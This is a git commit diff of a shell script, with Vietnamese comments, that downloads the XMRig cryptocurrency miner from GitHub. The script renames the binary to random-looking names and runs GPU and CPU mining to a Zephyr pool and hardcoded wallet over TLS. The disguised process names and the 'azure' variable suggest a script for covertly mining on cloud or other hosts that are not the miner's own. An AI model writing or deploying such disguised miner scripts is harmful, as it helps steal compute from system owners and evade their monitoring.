9f1dd38eb455f0300219bc0e893624c961548218
wollfoo <nhac.tien1988@gmail.com>
2024-05-07 00:26:27 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -6,7 +6,7 @@ sudo sysctl -w vm.nr_hugepages=1280
 sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
 
 # Định nghĩa các biến cần thiết
-VERSION=6.21.0
+VERSION=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "tag_name" | awk '{print substr($2, 2, length($2)-3)}')
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 POOL=ca-zephyr.miningocean.org:5432
@@ -14,28 +14,19 @@ USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPum
 ALGO=rx/0
 DONATE=1
 
-# Cài đặt các gói cần thiết
-apt-get install -y git wget screen cmake g++ libuv1-dev libssl-dev libhwloc-dev
-
-# Tạo thư mục và di chuyển vào thư mục làm việc
-mkdir -p /usr/share/work
-cd /usr/share/work
-
 # Tải xuống và giải nén XMRig
-rm -rf xmrig-$VERSION
-wget https://github.com/xmrig/xmrig/archive/refs/tags/v$VERSION.tar.gz
-tar -xvzf v$VERSION.tar.gz
-rm -f v$VERSION.tar.gz
-mv xmrig-$VERSION xmrig
-cd xmrig
-mkdir build && cd build
-cmake ..
-make -j$(nproc)
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
+tar -xvf xmrig-$VERSION-linux-x64.tar.gz
+rm -f xmrig-$VERSION-linux-x64.tar.gz
+cd xmrig-$VERSION
 
-# Đổi tên tệp thực thi và sao chép để sử dụng
+# Đổi tên tệp thực thi và sao chép để sử dụng cho GPU
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f xmrig
 
 # Bắt đầu đào coin trên GPU với XMRig
 ./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ws-p x -a $ALGO -k --tls
+
+# Bắt đầu đào coin trên CPU với XMRig
+./xmrig --donate-level $DONATE -o $POOL -u $USERNAME.ws-c x -a $ALGO -k --tls
